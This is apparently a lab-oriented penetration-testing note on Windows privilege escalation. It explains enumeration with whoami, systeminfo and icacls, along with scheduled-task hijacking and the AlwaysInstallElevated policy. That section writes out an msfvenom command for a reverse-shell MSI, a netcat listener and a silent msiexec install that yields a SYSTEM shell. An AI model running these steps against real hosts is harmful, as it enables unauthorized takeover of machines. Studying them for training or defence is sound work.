---
type: technique
platform: windows
status: working
fluency: guided
source: lab
updated: 2026-09-03
---

# Windows — Privilege Escalation

The ordered sweep is [[Windows-Run-Sheet]] — run that beside the shell. This note is the Windows-side index: the question each vector answers, and the note that carries it out. Read it when the sheet has handed you a hit and you need the technique behind it.

Escalation here means using access as user A to reach user B by abusing a weakness — a service or scheduled-task misconfiguration, a privilege your account should not hold, vulnerable software, or a missing patch. B is usually an administrator, but stepping through another unprivileged account first is a normal shape.

## Account types

Reading `whoami /all` requires knowing what these mean, so they belong before the vectors.

| Account | What it is |
|---|---|
| **Administrators** | Full control: any system setting, any file. Membership in the `Administrators` group is the definition |
| **Standard users** | Members of `Users`. Can work, cannot make permanent or system-wide changes; effectively confined to their own files |
| **SYSTEM / LocalSystem** | The OS's own account for internal tasks. Higher than administrator — full access to every file and resource on the host. The usual target |
| **Local Service** | Runs services with minimum privileges; goes over the network **anonymously**, so it can prove nothing about itself to another machine |
| **Network Service** | Runs services with minimum privileges; authenticates over the network **as the computer account** — every domain-joined machine has its own account in the domain, named `HOSTNAME$` |

The last three are built-in and managed by Windows — they cannot be logged into like a normal account. You inherit their privileges by exploiting a service already running as one of them, which is why a boring-looking service account is often the whole path.

## Start here — situational awareness

**Why now** — you have a fresh Windows shell and nothing else. Before choosing any vector you build the one picture that tells you which vectors are even open: who you are, what groups and privileges your token holds, and how the host is patched. Every decision below reads off this output, so running it first is what stops you guessing.

```cmd
whoami /all
```

```cmd
systeminfo
```

```cmd
net user
```

```cmd
net localgroup administrators
```

- `whoami /all` → your [[Security-Terms#^sid|SID]], **group memberships**, and **token privileges** in one call. A **SID** (Security Identifier) is the unique string Windows uses internally for an account instead of its name (`S-1-5-21-...`), and a **token** is the badge Windows stamps on every process you start, carrying your SID, your group memberships and your privileges — so "what your token holds" and "what you are allowed to do" are the same question. The privileges block is the part most people scroll past and is exactly where the fast wins are.
- `systeminfo` → OS build, patch level (`Hotfix(s)`), and domain membership — the input to [[Windows-Automated-Enumeration]]'s suggesters. A **hotfix** is one Microsoft patch, named by a `KB` number; the list of installed ones is exactly what a patch suggester compares against the list of every patch Microsoft has released.
- `net localgroup administrators` → who is already admin, so you know which account you are trying to become.

**What you will see**

- **Found** — in the privileges block, `SeImpersonatePrivilege`, `SeBackupPrivilege`, `SeTakeOwnershipPrivilege`, `SeRestorePrivilege` or `SeLoadDriverPrivilege` shown as `Enabled` or even `Disabled`. In groups, membership in `Backup Operators`, `Server Operators`, or a non-default admin-like group. Either is a direct lead.
- **Empty** — a token holding only the stock privileges and a plain `Users` membership is the common case; it closes the token-privilege route and pushes you to the service, task and credential vectors, which do not depend on your token at all.
- **Error** — `whoami /all` printing a **stripped** privileges block (only two or three entries) means you are in a non-elevated / filtered token or a limited service context, not that you hold nothing. **[[Security-Terms#^uac|UAC]]** (User Account Control) is the Windows feature that gives an account in the `Administrators` group *two* tokens — a stripped everyday one, and a full one you only receive when a process is started with "Run as administrator" — so see [[Windows-Privilege-Abuse]] on that split before believing the list you got.
- **Noise** — the privileges list is long and mostly inert: `SeChangeNotifyPrivilege`, `SeIncreaseWorkingSetPrivilege`, `SeShutdownPrivilege` are held by everyone. Only the four or five abusable `Se*` names matter, and `NT AUTHORITY\SYSTEM` / `BUILTIN\Administrators` in an [[Security-Terms#^acl|ACL]] later are on every file — not findings.

**Then** — a `Se*` privilege sends you to [[Windows-Privilege-Abuse]]. A service account identity (`iis apppool\...`, `local service`) plus `SeImpersonate` is the same destination. A missing patch from `systeminfo` goes to [[Windows-Automated-Enumeration]] and [[Vulnerable-Software]]. An ordinary token with nothing flagged is not a dead end — it sends you down the vectors below, none of which need a special privilege.

## Vectors with their own note

These are written up in full; each link is where that vector is carried out.

- [[Windows-Credential-Harvesting]] — a password left on disk: unattend files, Credential Manager, `web.config`, PuTTY. Run this first; it needs no vulnerability.
- [[PowerShell-History]] — [[Security-Terms#^psreadline|PSReadLine]] history as a credential source, per user.
- [[Windows-Automated-Enumeration]] — [[Security-Terms#^winpeas|WinPEAS]] and [[Security-Terms#^privesccheck|PrivescCheck]] (scripts you copy onto the target and run there), [[Security-Terms#^wes-ng|WES-NG]] and the Metasploit suggester (run on your own attack box against the target's `systeminfo` text), and the `whoami /priv` context that makes their output readable.
- [[Windows-Service-Abuse]] — a service whose binary is writable, whose path is unquoted over a writable directory, or whose own **[[Security-Terms#^dacl|DACL]]** (Discretionary Access Control List: the list of who-may-do-what attached to an object — here to the service itself, not to any file) lets you `sc config` it to run as `LocalSystem`.
- [[Windows-Privilege-Abuse]] — cashing in `whoami /priv`: SeBackup, SeTakeOwnership, SeImpersonate.
- [[Vulnerable-Software]] — unpatched third-party software; enumerate versions, find a public exploit ([[Public-Exploit-Workflow]]).
- [[Web-Server-Checks#IIS|IIS]] — Internet Information Services, Microsoft's web server; the account its application pool runs as is the usual source of a `SeImpersonate` foothold.

## Scheduled tasks

**Why now** — `whoami /all` gave you an ordinary token, so you look for the file-plus-schedule mismatch: a task that runs as a more privileged user, whose target binary you can write. Same shape as a weak service, minus the restart requirement. You are hoping to find a task pointing at a writable path.

The filtered listing that produces a candidate task lives in [[Windows-Run-Sheet#5 — What runs automatically|the run sheet, step 5]] — run it there. This note starts from the task name it handed you.

```cmd
schtasks /query /tn <task> /fo list /v
```

```cmd
icacls C:\path\to\task.bat
```

- `schtasks` → the built-in Windows command for scheduled tasks: jobs the OS runs on a timer or a trigger, each under a named account (its **principal**). `/query` lists them, `/fo list` prints one field per line, and `/v` is verbose, which is what makes the account and the command line appear at all.
- `findstr` → cmd.exe's `grep`, built into Windows. `/i` is case-insensitive; `/c:` keeps each quoted phrase as one literal search string, and without it `findstr` treats the spaces as separators and matches far more than you meant.
- `icacls` → the built-in command that prints (and edits) a file or folder's access control list — who may read, write or run it. The full reading of its letters is the last section of this note.
- Two fields decide it: **`Task To Run`** (what executes) and **`Run As User`** (who it becomes). A task that runs as SYSTEM or an admin, pointing at a binary you can overwrite, is the finding.

**What you will see**

- **Found** — a task under a non-Microsoft path whose `Run As User` is privileged and whose `Task To Run` binary shows `(F)`, `(M)` or `(W)` for your principal in `icacls`. That is the whole vulnerability.
- **Empty** — no non-Microsoft task, or every writable target runs as you already: real, and it closes this vector. Move to the service note, which is the more common Windows path.
- **Error** — `ERROR: Access is denied.` from `schtasks /query` on a specific task means the task object's ACL hides it from you — note it and retry after any escalation. A bare `schtasks /query` with no filter floods the screen; that is why the `findstr` is there.
- **Noise** — nearly all of the raw output is Microsoft's own tasks under `\Microsoft\Windows\...` (`SilentCleanup`, `.NET Framework NGEN`, defrag). Filter them out or the one that matters is invisible.

**Then** — a writable target binary: overwrite it and trigger the task. If the binary is **not** writable, check the *task object* — `schtasks /change /tn <task> /tr <cmd>` rewrites the command when the task's own ACL allows it, a separate permission from the file's. Then fire and read the result:

```cmd
schtasks /run /tn <task>
```

```cmd
schtasks /query /tn <task> /fo list /v | findstr /i "Last Result"
```

- `SUCCESS: Attempted to run` only means the **trigger** fired. `Last Result` is what says the binary actually ran: `0` is clean; anything else puts the fault in your payload file, not your listener. Empty here after a clean payload means the task is not due to run as you triggered it — check `Run As User` was really privileged.

## AlwaysInstallElevated

**Why now** — you want a cheap policy win: if this value is set, any `.msi` you run installs as SYSTEM, no matter your privileges. It is a two-line check, worth doing once whenever the ranked paths have run dry.

```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
```

- `reg query` → reads the **registry**, Windows' central settings database, split into *hives*. `HKLM` is `HKEY_LOCAL_MACHINE`, settings that apply to the whole machine; `HKCU` is `HKEY_CURRENT_USER`, settings belonging to the account you are running as.
- Both hives → `AlwaysInstallElevated` must be `0x1` in **[[Security-Terms#^hklm|HKLM]] and HKCU**. One alone does nothing, so read both before concluding.
- Read the **value**, not the key's presence: `0x0` is "set to off", which is not the same as the value being absent, but neither one is exploitable — only `0x1` in both is.

**What you will see**

- **Found** — `AlwaysInstallElevated    REG_DWORD    0x1` in **both** queries. That is the green light. An **[[Security-Terms#^msi|MSI]]** is a Windows Installer package — a `.msi` file the OS unpacks through its own installer service, which is the service this policy grants SYSTEM rights to. Build one on your attack box with **msfvenom**, Metasploit's payload generator (`msfvenom -p windows/x64/shell_reverse_tcp LHOST=<your-ip> LPORT=<port> -f msi -o evil.msi`), start a listener there (`nc -lvnp <port>`, netcat waiting for the connection), transfer the file ([[File-Transfer]]), then on the target run `msiexec /quiet /qn /i evil.msi` — `/i` installs the package, `/quiet` answers every prompt for you and `/qn` shows no interface at all, so nothing appears on the target's screen.
- **Empty** — the usual result, and it means safe: either the key does not exist (`ERROR: The system was unable to find the specified registry key or value.`) or one/both hives read `0x0`. Closes this vector.
- **Error** — the not-found error above is the normal negative, not a failure. There is no other meaningful error here.
- **Noise** — `0x0` in one hive and `0x1` in the other looks like a hit and is not — both must be `0x1`.

**Then** — set in both hives goes to a `msiexec /quiet /qn /i` install for a SYSTEM shell. Not set closes it; return to the service and credential vectors.

> [!important] Dropping the payload file: encoding, and the space before `>`
> PowerShell's `>` is `Out-File`, and in **Windows PowerShell 5.1** — what you get on a stock Windows host — its default encoding is **[[Security-Terms#^utf16|UTF-16LE]] with a [[Security-Terms#^bom|BOM]]** — two bytes per character, preceded by a byte-order mark, where `cmd.exe` expects one byte per character and no marker. A `.bat` written that way is unreadable to `cmd.exe`: the task fires, runs the file, and silently does nothing. (PowerShell 7 defaults to UTF-8 instead, so the same line behaves differently depending on which shell you landed in — do not assume.)
>
> Be explicit: `Set-Content -Path <file> -Value '<cmd>' -Encoding Ascii`, or drop to `cmd /c`.
>
> In `cmd`, keep the space before the `>`: a digit touching the redirect is parsed as a [[Security-Terms#^handle|file handle]], so `... 4444> file` writes to handle 4 and leaves the file **empty**, while `... 4444 > file` is correct. `(Get-Item <file>).Length` is the fastest check — 0 bytes means the redirect went nowhere.

> [!note] Scheduled tasks and [[Security-Terms#^alwaysinstallelevated|AlwaysInstallElevated]] are quick wins, not the main road —
> common in lab machines, rare in a real engagement. Check them when the eight steps of [[Windows-Run-Sheet]] have run dry, not before.

## Vectors still stubbed

Two more share the "runs as another user, loads something from a writable place" shape and are not written up yet:

- **DLL hijacking** — a process loading a DLL (Dynamic Link Library, a library file a program pulls in while it runs) by name rather than by full path, from a writable directory that Windows searches earlier than the real one. Same root cause as the unquoted service path.
- **Registry ACLs** — writable keys under `HKLM\SYSTEM\CurrentControlSet\Services\` that let you repoint a service without touching a file.

When a box has a vector this note does not cover, two references list nearly all of them — reach for these, not a blog-of-the-day:

- [[Security-Terms#^hacktricks|HackTricks]] — Windows Local Privilege Escalation: the exhaustive walk-through, checklist-shaped. `https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation`
- [[Security-Terms#^payloadsallthethings|PayloadsAllTheThings]] — Windows Privilege Escalation: command-first, copy-paste cheatsheet. `https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md`

They are lookup material — bookmarks for when you are stuck, not reading for its own sake.

## Reading `icacls` output

**Why now** — you have a candidate path in hand: a service binary, a scheduled-task script, a folder that sits in a search order. Every vector above ends at the same question — *can I write to this?* — and the same command answers it, so the output is worth reading properly once. This is the note-wide skill, not one vector's, and it is what turns a list of paths from WinPEAS into a ranked shortlist.

```cmd
whoami /groups
```

```cmd
icacls C:\path\to\file.exe
```

```cmd
icacls C:\path\to\
```

**The principal comes first.** An **ACL** (Access Control List) is the ordered list of permission entries on a file, folder, service or registry key; each entry is an **[[Security-Terms#^ace|ACE]]** (Access Control Entry) naming one **principal** — a user account or a group — and the rights it grants or denies. An entry means nothing until you know whether its principal includes you. `whoami /groups` first; then the names worth reacting to are your own username, `BUILTIN\Users`, `Everyone`, `Authenticated Users`, and `NT AUTHORITY\INTERACTIVE`. `NT AUTHORITY\SYSTEM` and `BUILTIN\Administrators` sit on every file on the disk — seeing them is not a finding.

**Then the letters.**

| | Means | Verdict |
|---|---|---|
| `F` | Full control | Overwrite it |
| `M` | Modify — read, write, delete | Overwrite it |
| `W` | Write / append data | Worth testing: appending a line to a `.bat` is already enough |
| `RX` / `R` | Read, execute | Dead end on the file itself — check the folder |
| `(I)` | Inherited from the parent folder | Not weaker, just not set on the file directly |

**Check the folder, not only the file.** Write access on the *directory* lets you create new files there, and often delete-and-replace a file whose own ACL denies you. That is the whole basis of unquoted service paths and DLL hijacking, and it is the check people skip.

**What you will see**

- **Found** — an entry naming you, `BUILTIN\Users`, `Everyone`, `Authenticated Users` or `NT AUTHORITY\INTERACTIVE` with `(F)`, `(M)` or `(W)`, against a path that something more privileged runs or loads. The pairing is the finding; the letters on their own are not.
- **Empty** — an ACL listing only `SYSTEM`, `Administrators` and `Users:(RX)` is a genuine negative for that **file** — and a direct instruction to run the command again on the folder holding it. Empty on the file and empty on the folder closes the candidate; empty on the file alone closes nothing.
- **Error** — `Access is denied` means you cannot read the ACL. It does **not** mean the file is safe; it is a token limit, so retry after any escalation. `The system cannot find the path specified` on a service path is usually the unquoted-path shape — you copied the command line including its arguments, so quote the executable and try again.
- **Noise** — `NT AUTHORITY\SYSTEM` and `BUILTIN\Administrators` sit on every file on the disk; seeing them is not a finding. `(I)` is not weaker, only inherited — but it is a tell in its own right: the weakness lives on the containing folder, so everything else in that folder is likely writable too.

**Then** — a writable file or folder on a path something privileged runs goes back to the vector it belongs to: [[Windows-Service-Abuse]] for a service binary or an unquoted path, [[Windows-Privilege-Abuse]] for what a held privilege reaches. A clean file sends you to its folder; clean on both sends you back to [[Windows-Automated-Enumeration]] for the next candidate, with this one struck off. `Access is denied` strikes nothing off — re-run it after the next escalation, when your token is different.

## Rarely — worth one command, not worth a step

**Why now** — the vectors above came back empty and you are looking for a credential left behind rather than a permission left open. Everything of that kind lives in one note, and duplicating three of its sections here would mean two copies drifting apart.

- [[Windows-Credential-Harvesting]] — answer files, stored credentials, autologon, configuration files and saved sessions, each with the exact path.
- Its own `## Rarely` section carries the three stores that pay perhaps twice a year: wireless profiles, the credential vault, and policy preferences on a domain share.

## Next

- [[Windows-Credential-Harvesting]] — run this first: no vulnerability required
- [[Windows-Automated-Enumeration]] — WinPEAS, the candidate generator
- [[Windows-Run-Sheet]] — the ordered sweep that surfaces and ranks these paths

## Gaps

- Credential *files and registry values* are covered by [[Windows-Credential-Harvesting]]; [[Security-Terms#^sam|SAM]]/SYSTEM hive extraction is now [[Windows-Privilege-Abuse]] (via SeBackup). Credential material in **[[Security-Terms#^lsass|LSASS]] memory and [[Security-Terms#^dpapi|DPAPI]]** is still uncovered.
- Hash handling once credentials are dumped is [[Hash-Cracking]]; pulling them from LSASS memory in the first place is still uncovered.
- Vulnerable / unpatched third-party software is now its own note, [[Vulnerable-Software]] (enumeration + handoff to [[Public-Exploit-Workflow]]).
- Service misconfigurations are now [[Windows-Service-Abuse]]. Scheduled tasks and AlwaysInstallElevated stay inline above; DLL hijacking and registry-ACL tampering share the "runs as another user, writable target" pattern but are still stubs.
